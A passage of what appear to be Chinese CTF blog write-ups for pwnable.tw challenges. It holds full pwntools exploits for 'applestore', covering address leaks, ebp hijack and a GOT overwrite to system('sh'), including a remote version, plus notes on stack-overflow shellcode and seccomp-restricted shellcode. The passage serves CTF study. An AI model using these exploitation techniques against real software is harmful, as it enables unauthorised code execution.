add函数中是申请一块堆内存用于存放加入购物车的手机信息\n- 而iphone 8的信息是存在栈空间V2处的，而这个V2又会被加入到之前的链表中。因此一个栈空间地址被写入了堆中，而栈是不断在变化的，因此就出现了一段可能被控制的内存，即V2附近。\n\n由以上代码中的信息，我们可以得到如下图所示栈空间的布局：\n\n![](applestore-4.png)\n\n#### 漏洞点\n\n> checkout里存放在栈上的iphone 8信息就是本题的漏洞点，因为栈的地址被写入了堆中。\n\n这段栈空间在checkout函数返回后，会被其他函数使用。因此堆中指向的栈空间信息是可能被我们任意更改的。\n\n而本题恰好给我们提供了两个函数：cart和delete，分别用于打印和删除（在链表中执行unlink操作时即任意地址写），可以被我们利用来泄露信息和任意地址写限定值（或限定地址写任意值）。\n\n## 1.3 触发漏洞\n\n为了触发漏洞，必须使checkout的iphone 8分支被执行。也就是在执行checkout之前，我们必须add够正好7174美元的手机。手机有4种价格：199, 299, 399, 499。那么怎么搭配这四种价格凑齐7174美元，就需要使用各自的方法了。这里提供几种途径：\n\n- Z3求解器\n- matlab\n- wolf mathematics\n- 靠各位的智力脑算+手算...\n\n这里借用一下我男票算到的结果：6 * 199 + 20 * 299 = 7174\n\n触发脚本如下：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('>',op)\n    myps.sendlineafter('>',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\nmyps.recv()\nmyps.interactive()\n```\n\n执行该脚本，得到如下结果，进入了1美元买iphone8的分支：\n\n```shell\n20: iPhone 6 Plus - $299\n21: iPhone 6 Plus - $299\n22: iPhone 6 Plus - $299\n23: iPhone 6 Plus - $299\n24: iPhone 6 Plus - $299\n25: iPhone 6 Plus - $299\n26: iPhone 6 Plus - $299\n*: iPhone 8 - $1\nTotal: $7175\nWant to checkout? Maybe next time!\n> $  \n```\n\n此时，程序回到了handler分支，checkout的函数栈已经被释放，因此iphone 8的栈空间接下来可能存在两种可能：\n\n- 1、这段栈空间的值没被覆盖，那么iphone 8 的栈块信息是还在的，此时查看链表或者删除链表中该项也许不会有问题。（没有尝试）\n- 2、这段栈空间被分配给了新函数，并且新函数覆盖上了新值。那么此时对整个链表进行查看或删除iphone 8这一项时，就会出现问题。\n\n我们执行4（cart查看购物车），等于将刚刚chekout的栈分配给了cart函数。那么就会出现如下错误（如果使用delete删除最后一项，也会出错）：\n\n```shell\nTotal: $7175\nWant to checkout? Maybe next time!\n> $ 4\n[DEBUG] Sent 0x2 bytes:\n    '4\\n'\n[DEBUG] Received 0x24 bytes:\n    'Let me check your cart. ok? (y/n) > '\nLet me check your cart. ok? (y/n) > $ y\n······\n20: iPhone 6 Plus - $299\n21: iPhone 6 Plus - $299\n22: iPhone 6 Plus - $299\n23: iPhone 6 Plus - $299\n24: iPhone 6 Plus - $299\n25: iPhone 6 Plus - $299\n26: iPhone 6 Plus - $299\n27: �f\\x89p\\x0c\\x89x\\x0e\\x05- $-136495008\n[*] Got EOF while reading in interactive\n$  \n```\n\n出错的原因是，iphone8相关的数据都存在栈上，在checkout函数退出后，栈上的数据被cart函数的局部变量覆盖。导致cart中遍历访问链表时，访问到iphone 8时访问了非法的地址。\n\n# 2 利用\n\n1.2.5节漏洞点中阐述了这个漏洞可以用来泄露信息以及有约束地写。\n\n- 1、如果我们把iphone 8数据所在的栈空间覆盖为构造的特定数据，就可以打印（泄露）我们想要的内容。比如说libc。（后面需要用到堆地址，所以这里还需泄露堆、以及栈空间的地址）\n- 2、有约束地写，由于got表可写，因此我们一定是利用这个任意地址写去覆写got表项。\n\n## 2.1 信息泄露- cart\n\n如下图所示，精心布置cart函数的栈帧，控制ebp-0x20处连续16个字节的值（在IDA中查看cart函数的伪码可知，ebp-0x20 ~ ebp-0x10空间是输入buf，可控）。如图中红色栈块所示，cart函数打印到栈上的块时，会将got表中puts函数的地址打印出来。并且由于fd不为空，会继续以mycart偏移8字节处作为一个新块，去打印info_loc的地址，此时就将堆的地址泄露出来了（当然也可以像泄露puts地址一样，去泄露堆地址）。\n\n利用泄露puts函数地址的方法，可以逐步泄露其他信息。\n\n![](applestore-5.png)\n\n### 2.1.1 泄露libc和堆地址\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4))\n##修正heap地址\n#heap_addr = u32(myps.recv(44)) - 0x490\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\n\ngdb.attach(myps,'b * 0x08048BEB')\nmyps.interactive()\n```\n\n打印出的两个地址如下：\n\n```shell\n[!] libc_addr:0xf7d5a000\n[!] heap_addr:0x830c490\n```\n\n在执行脚本过程中弹出的gdb调试终端框中，执行vmmap，查看libc的起始地址为0xf7d5a000。使用heap chunks查看第一个堆的地址（0x830c008 - 0x8 = 0x830c000），并对上述打印的堆地址修正（0x830c000 = 0x830c490 - 0x490，已更改到上述代码中）：\n\n```bash\ngef➤  vmmap\nStart      End        Offset     Perm Path\n0xf7d5a000 0xf7f07000 0x00000000 r-x /lib32/libc-2.23.so\n0xf7f07000 0xf7f08000 0x001ad000 --- /lib32/libc-2.23.so\n0xf7f08000 0xf7f0a000 0x001ad000 r-- /lib32/libc-2.23.so\n0xf7f0a000 0xf7f0b000 0x001af000 rw- /lib32/libc-2.23.so\n\ngef➤  heap chunks\nChunk(addr=0x830c008, size=0x408, flags=PREV_INUSE)\n    [0x0830c008     3e 20 3a 20 90 c4 30 08 c7 20 2d 20 24 30 0a 08    > : ..0.. - $0..]\nChunk(addr=0x830c410, size=0x18, flags=PREV_INUSE)\n    [0x0830c410     90 c4 30 08 c7 00 00 00 28 c4 30 08 68 b0 04 08    ..0.....(.0.h...]\nChunk(addr=0x830c428, size=0x18, flags=PREV_INUSE)\n    [0x0830c428     40 c4 30 08 c7 00 00 00 50 c4 30 08 10 c4 30 08    @.0.....P.0...0.]\nChunk(addr=0x830c440, size=0x10, flags=PREV_INUSE)\n    [0x0830c440     69 50 68 6f 6e 65 20 36 00 00 00 00 19 00 00 00    iPhone 6........]\n```\n\n### 2.1.2 泄露栈地址\n\n第26个节点的fd中存放的是第27个节点的地址（即栈中某个地址）。\n\n接着在1.3.1节中弹出的gdb调试框中，打印esp和ebp的值，分别为0xfffd4038和0xfffd4078。由此我们推测栈空间的地址应该是由0xfffd开头的，然后去打印出的堆chunks中寻找\"fd ff\"字样。仅在addr=0x830c8a8的chunk中找到一个\"0xfffd4058\"，这就是一个栈空间的地址。那么该地址值距离堆起始地址的偏移是0x830c8a8 + 0x8 - 0x830c000 = 0x8b0：\n\n```shell\nChunk(addr=0x830c890, size=0x18, flags=PREV_INUSE)\n    [0x0830c890     10 c9 30 08 2b 01 00 00 a8 c8 30 08 40 c8 30 08    ..0.+.....0.@.0.]\nChunk(addr=0x830c8a8, size=0x18, flags=PREV_INUSE)\n    [0x0830c8a8     c0 c8 30 08 2b 01 00 00 58 40 fd ff 90 c8 30 08    ..0.+...X@....0.]\nChunk(addr=0x830c8c0, size=0x18, flags=PREV_INUSE)\n    [0x0830c8c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x830c8d8, size=0x10, flags=PREV_INUSE)\n    [0x0830c8d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]\nChunk(addr=0x830c8e8, size=0x28, flags=PREV_INUSE)\n    [0x0830c8e8     b0 a7 f0 f7 b0 a7 f0 f7 00 00 00 00 11 07 02 00    ................]\nChunk(addr=0x830c910, size=0x18, flags=)\n    [0x0830c910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x830c928, size=0x206e0, flags=PREV_INUSE)  ←  top chunk\ngef➤  p $esp\n$1 = (void *) 0xfffd4038\ngef➤  p $ebp\n$2 = (void *) 0xfffd4078\n```\n\n由上述内容可知，我们想要的栈空间地址在堆起始地址heap_addr+0x8b0处。因此在2.1.1的python代码中再添加一步，就可以泄露栈空间地址：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\nlog.warn('satck_addr:0x%x' % stack_addr)\n\ngdb.attach(myps,'b * 0x08048BEB')\nmyps.interactive()\n```\n\n得到如下结果：\n\n```shell\n[!] libc_addr:0xf7d48000\n[!] heap_addr:0x9603000\n[!] satck_addr:0xffb3e518\n===========================================================\nChunk(addr=0x9603890, size=0x18, flags=PREV_INUSE)\n    [0x09603890     10 39 60 09 2b 01 00 00 a8 38 60 09 40 38 60 09    .9`.+....8`.@8`.]\nChunk(addr=0x96038a8, size=0x18, flags=PREV_INUSE)\n    [0x096038a8     c0 38 60 09 2b 01 00 00 18 e5 b3 ff 90 38 60 09    .8`.+........8`.]\nChunk(addr=0x96038c0, size=0x18, flags=PREV_INUSE)\n    [0x096038c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x96038d8, size=0x10, flags=PREV_INUSE)\n    [0x096038d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]\nChunk(addr=0x96038e8, size=0x28, flags=PREV_INUSE)\n    [0x096038e8     b0 87 ef f7 b0 87 ef f7 00 00 00 00 11 07 02 00    ................]\nChunk(addr=0x9603910, size=0x18, flags=)\n    [0x09603910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x9603928, size=0x206e0, flags=PREV_INUSE)  ←  top chunk\ngef➤  p $esp\n$1 = (void *) 0xffb3e4f8\ngef➤  p $ebp\n$2 = (void *) 0xffb3e538\n```\n\n## 2.2 任意地址写 - delete\n\n以下图为例，假如我们要删除info_loc_1这个堆块，则必须执行如下几条命令，将其从链表中拆除：\n\n```c\ninfo_loc_2.bk = info_loc_1.bk\ninfo_loc.fd = info_loc_1.fd\n```\n\n如果只用当前要被删除的项info_loc_1来表示，相当于：\n\n```c\ninfo_loc_1.fd[3] = info_loc_1.bk\ninfo_loc_a.bk[2] = info_loc_1.fd\n//简写为:\nfd[3] = bk\nbk[2] = fd\n```\n\n![](applestore-6.png)\n\n如下图，可以形象地描述任意地址写的两种情况，实际利用使选择任何一种都可。\n\n![](applestore-7.png)\n\n### 2.2.1 泄露ebp地址\n\n下面验证一下handler下的函数在被调用时，其ebp是一样的：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\nlog.warn('satck_addr:0x%x' % stack_addr)\nlog.warn('ebp_addr:0x%x' % ebp_addr)\n\ngdb.attach(myps,'b * 0x080489C0 \\nc \\np $ebp')\nmysend(delete,'3')\n\nmyps.interactive()\n```\n\n如下图，发现ebp地址对得上，说明delete函数中的ebp确实跟之前函数的ebp是一致的：\n\n```shell\n[!] libc_addr:0xf7d5f000\n[!] heap_addr:0x8c89000\n[!] satck_addr:0xffa9f2d8\n[!] ebp_addr:0xffa9f2f8\n=========================================================\n[#0] 0x80489c0 → delete()\n[#1] 0x8048c46 → handler()\n[#2] 0x8048cf5 → main()\n──────────────────────────────────────────────────────\n$1 = (void *) 0xffa9f2f8\ngef➤  \n```\n\n### 2.2.2 劫持ebp到got表\n\n泄露完ebp地址后，就可以利用delete函数去更改栈空间中存放的old ebp，从而使函数退出时，实现ebp劫持。\n\n劫持到哪儿呢？当然是got表啦！通过IDA查看该二进制程序中got表的地址是0x0804B000至0x0804B040，因此got表底部为0x0804B044。\n\n将ebp劫持到got表底部的验证代码如下：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\ngdb.attach(myps,'b * 0x08048A6F \\nc \\np $ebp')\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(0x0804B044)\nmysend(delete,payload)\n\nmyps.interactive()\n```\n\n在gdb窗口中，验证old ebp确实被替换成了我们想要的0x0804B044（got表尾地址）。\n\n```shell\ngef➤  p $ebp\n$1 = (void *) 0xffba66e8\ngef➤  p $esp\n$2 = (void *) 0xffba66a0\ngef➤  x/20wx 0xffba66e8\n0xffba66e8:\t0x0804b044\t0x08048c46\t0xffba6706\t0x00000015\n0xffba66f8:\t0xffba6718\t0xf7e26020\t0x00000003\t0x0a333918\n0xffba6708:\t0xf7e26000\t0x080486f7\t0x08048e23\t0x00000006\n0xffba6718:\t0xffba6774\t0x87bfaa00\t0xf7f8edbc\t0xf7f001e5\n0xffba6728:\t0xffba6748\t0x08048cf5\t0x0804b068\t0x00000000\ngef➤  x/20wx 0xffba66a0\n0xffba66a0:\t0x08048f98\t0x00000004\t0x0804b028\t0x00000000\n0xffba66b0:\t0x00000004\t0xffba66c8\t0x00000004\t0xffba66dc\n0xffba66c0:\t0x0804b044\t0x00346706\t0x0804b028\t0x00000001\n0xffba66d0:\t0xffba66dc\t0x0804b044\t0x0000000a\t0x87bfaa00\n0xffba66e0:\t0xf7f8d000\t0xf7f8d000\t0x0804b044\t0x08048c46\n```\n\n### 2.2.3 劫持ebp并覆写got表\n\n上述将ebp劫持到got表尾后，程序回到了handler中，函数如下。可以看到which_phone变量在ebp-0x22处（此时ebp-0x22正好在got表中），因此我们可以通过which_phone的输入去更改got表中的内容。\n\n如果我们能把atoi改成system，并且把which_phone的内容改成\"sh\"，那么就能在atoi(&which_phone)时获得shell。\n\n```c\nunsigned int handler()\n{\n  char which_phone; // [esp+16h] [ebp-22h]\n  unsigned int v2; // [esp+2Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  while ( 1 )\n  {\n    printf(\"> \");\n    fflush(stdout);\n    my_read(&which_phone, 0x15u);\n    switch ( atoi(&which_phone) )\n    { ······\n```\n\ngot表最后几项内容：\n\n```assembly\n.got.plt:0804B030 9C B0 04 08                   off_804B030     dd offset exit          ; DATA XREF: _exit↑r\n.got.plt:0804B034 A0 B0 04 08                   off_804B034     dd offset __libc_start_main\n.got.plt:0804B034                                                                       ; DATA XREF: ___libc_start_main↑r\n.got.plt:0804B038 A4 B0 04 08                   off_804B038     dd offset memset        ; DATA XREF: _memset↑r\n.got.plt:0804B03C A8 B0 04 08                   off_804B03C     dd offset asprintf      ; DATA XREF: _asprintf↑r\n.got.plt:0804B040 AC B0 04 08                   off_804B040     dd offset atoi          ; DATA XREF: _atoi↑r\n.got.plt:0804B040                               _got_plt        ends\n.got.plt:0804B040\n.data:0804B044                               ; =======================================================\n```\n\natoi函数是got表中最后一项，它的上一项是asprintf。,令asprintf的地址为ebp-0x22，则构造which_phone为\"sh\\x00\\x00\" + (mylibc.symbols['system'] + libc_addr)，就可以将asprintf和atoi表项分别覆盖为\"sh\\x00\\x00\"和\"system函数\"。因此当执行switch括号中的atoi(&which_phone)时，相当于执行了system(\"sh\")。\n\n跟2.2.2中劫持ebp到got表的位置不同，这里需将ebp劫持到myelf.got['asprintf']+0x22，才能使其满足上述条件。\n\n因此payload为：\n\n```python\npayload = \"2\\x00\" + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr - 0xc) + p32(myelf.got['asprintf']+0x22)\n```\n\n# 3 EXP\n\n## 3.1 本地\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(myelf.got['asprintf']+0x22)\nmysend(delete,payload)\n\nwhich_phone = \"sh\\x00\\x00\" + p32(mylibc.symbols['system'] + libc_addr)\nmyps.sendlineafter('> ',which_phone)\nmyps.interactive()\n```\n\n## 3.2 远程\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('../libc_32.so.6')\nmyps = remote('chall.pwnable.tw',10104)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(myelf.got['asprintf']+0x22)\nmysend(delete,payload)\n\nwhich_phone = \"sh\\x00\\x00\" + p32(mylibc.symbols['system'] + libc_addr)\nmyps.sendlineafter('> ',which_phone)\nmyps.interactive()\n```\n\n# 4 reference\n\n[C语言alarm()函数：设置信号传送闹钟](http://c.biancheng.net/cpp/html/334.html)\n\n[asprintf](https://blog.csdn.net/yuan08shandong/article/details/50580834)\n","tags":["heap"],"categories":["CTF"]},{"title":"pwnable.tw 之 start ORW 3x17","url":"/2020/03/04/startORW317/","content":"\n这里把pwnable.tw上前面的几个题放在一起写篇博客，分别是：\n\n- start\n- orw\n- 3x17\n\n# 1 start\n\n## 1.1 题目\n\nhttps://pwnable.tw/challenge/#1\n\n## 1.2 分析\n\n首先，查看文件属性和开启的保护措施：\n\n![](start1.png)\n\n运行起来试试：\n\n![](start2.png)\n\nIDA查看二进制文件start：\n\n![](start3.png)\n\n![](start4.png)\n\n发现除了_start和_exit没有熟悉的main函数，使用IDA查看伪代码也不是一个正常的函数，原因在于这是一个纯汇编代码。\n\n因此我们需要看懂这段汇编都做了些什么：\n\n1    压了_exit函数的地址\n\n2    清eax,ebx,ecx,edx\n\n3    压字符串，20个字节\n\n4    分别给eax,ebx,ecx,edx赋值(4,1,esp,20),然后int 80h系统调用\n\n5    清ebx,给eax,edx赋值（3，60），然后int 80h系统调用\n\n6    esp加20个字节收回栈空间\n\n7    根据栈上的返回地址（_exit）返回\n\n可以看到有两次系统调用（eax是系统调用号，然后ebx，ecx，edx，esx，edi分别放置系统调用的参数）。查表可知4对应的系统调用是write，3对应的是read。\n\n因此以上4和5可以翻译成：\n\n```c\nwrite(1,esp,20); // 从栈上读20个字节到标准输出（读内存）\nread(0,esp,60);  // 从标准输入写60个字节到栈上（写内存）\n```\n\n很明显是个栈溢出，read的60个字节会覆盖到返回地址exit。\n\n![](start5.png)\n\n## 1.3 利用\n\nexit被覆盖后，就控制了eip，此时应该让eip指向哪儿才能get shell呢？当然是指向我们构造的一段shellcode，shellcode应该放哪儿呢？如果放在栈上，但此时我们并不知道栈的地址，那么能不能泄露栈地址呢？再看一下汇编代码：\n\n![](start6.png)\n\n第一次执行完retn之后，esp指向下图位置：\n\n![](start7.png)\n\n如果此时从08048070处开始执行，就可以将old esp的值打印出来，old esp = esp+4。并且可以继续从此esp指向的位置写0x3C字节，如下图所示，esp往上是第二次的输入，我们可以好好构造这次输入，让下次执行retn时，再一次劫持eip（即ret addr），将ret addr覆盖为shellcode addr即可。\n\n![](start8.png)\n\n现在重新理一下，oldesp是write系统调用时泄露出来的，因此shellcode addr是old esp+0x14。那么现在需要找一段合适的shellcode来get shell。\n\n在http://shell-storm.org/shellcode/找到一段长度合适的shellcode如下：\n\n![](start9.png)\n\n![](start10.png)\n\nexp如下：\n\n![](start11.png)\n\n执行结果如下：\n\n![](start12.png)\n\n![](start13.png)\n\n## 1.4 记录\n\n### 1.4.1 pwntools的使用\n\nhttps://pwntools.readthedocs.io/en/stable/about.html\n\nhttp://brieflyx.me/2015/python-module/pwntools-intro/\n\npwntools的cyclic：\n\nhttps://www.cnblogs.com/liuyimin/p/7379985.html\n\n### 1.4.2 gdb-peda的使用\n\n[https://introspelliam.github.io/2017/08/03/pwn/gdb%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8/](https://introspelliam.github.io/2017/08/03/pwn/gdb的调试与使用/)\n\npwntools + gdb：\n\nhttp://docs.pwntools.com/en/stable/gdb.html?highlight=gdb#module-pwnlib.gdb\n\n### 1.4.3 shellcode database\n\nhttp://shell-storm.org/shellcode/\n\n# 2 orw\n\n## 2.1 题目\n\nhttps://pwnable.tw/challenge/#2\n\n## 2.2 分析\n\n首先，查看文件属性和开启的保护措施：\n\n![](orw1.png)\n\n运行起来试试：\n\n![](orw2.png)\n\nIDA查看二进制文件orw：\n\n![](orw3.png)\n\n伪代码如下：\n\n![](orw4.png)\n\n【orw_seccomp()是一个设置函数，这里的作用是设置只能使用open，read，write三个系统调用。具体原理参考2.4.2中。】\n\nread从标准输入读取数据放到shellcode地址处，然后转到shellcode处去执行代码。\n\nshellcode地址如下：\n\n![](orw5.png)\n\nview, open subviews, segments查看bss段属性：\n\n![](orw6.png)\n\n【这里显示不可执行，但checksec中RWX属性为has RWX segments且实际shellcode放到bss段中后可执行，这里目前还不知道是为什么？？？】\n\n## 2.3 利用\n\n题目只允许使用open，read，write三个系统调用函数，因此通过这三个函数实现打开/home/orw/flag文件，将其读到bss段或者栈中，然后再将bss或栈中的数据写到标准输出（即屏幕上）打印。\n\n![](orw7.png)\n![](orw8.png)\n\npayload对应的汇编代码：\n\n![](orw9.png)\n\n执行得到flag：\n\n![](orw10.png)\n![](orw11.png)\n\n## 2.4 记录\n\n### 2.4.1 64位ubuntu安装32位库\n\nubuntu 64位版本，安装支持32位程序的二进制库。\n\nsudo dpkg --add-architecture i386\n\nsudo apt-get update\n\nsudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386\n\n### 2.4.2 seccomp和prctl\n\n[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/)\n\nhttps://www.jianshu.com/p/62ede45cfb2e\n\nhttps://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\n\n### 2.4.3 pwnlib.shellcraft.i386\n\n这次题目中只用到了两个重要的函数。\n\n第一个是将字符串push到栈中，此时esp指向的就是这段字符串。\n\n`pwnlib.shellcraft.i386.pushstr(string, append_null=True)`\n\n```python\n>>>print shellcraft.i386.pushstr('aaaa').rstrip()\n  /* push 'aaaa\\x00' */\n  push 1\n  dec byte ptr [esp]\n  push 0x61616161\n```\n\n第二个是系统调用，syscall是要调用的函数（eax存放系统调用号），后面紧接着的是各个参数（ebx，ecx，edx等）（参数可以是某个寄存器，如’esp’）。\n\n`pwnlib.shellcraft.i386.linux.syscall(syscall=None, arg0=None, arg1=None, arg2=None, arg3=None, arg4=None, arg5=None)`\n\n```python\n>>> print pwnlib.shellcraft.i386.linux.syscall('SYS_execve', 1, 'esp', 2, 0).rstrip()\n    /* call execve(1, 'esp', 2, 0) */\n    push SYS_execve /* 0xb */\n    pop eax\n    push 1\n    pop ebx\n    mov ecx, esp\n    push 2\n    pop edx\n    xor esi, esi\n    int 0x80\n```\n\n参考别人的writeup，发现简洁写法（因为提前用context设置了目标环境）：\n\n![](orw12.png)\n\n# 3 3x17\n\n## 3.1 题目\n\nhttps://pwnable.tw/challenge/#32\n\n## 3.2 分析\n\n查看文件类型和开启的保护机制：\n\n![](3171.png)\n\n是去了符号表的，且静态链接。因此IDA的F5基本上没用了，只能纯看汇编。先执行看看：\n\n![](3172.png)\n\n属于addr和data，这里猜测会是将data写到addr上。 后续查看汇编代码，确实是这样。\n\nIDA打开二进制文件，只有start函数：\n\n![](3173.png)\n\n不知道以上各地址和寄存器的值代表什么内容，因此自己写了个printf(“hello world!\\n”)的小程序，使用IDA打开，找到start对应的汇编，如下：\n\n![](/3174.png)\n\n因此3x17的start可解析为下图：\n\n![](3175.png)\n\n64位汇编参数传递规则如下：\n\n![](3176.png)\n\n因此\n\n__libc_start_main(mian[sub_401B6D], argc, ubp_av, init [loc_4028D0], fini[sub_402960], 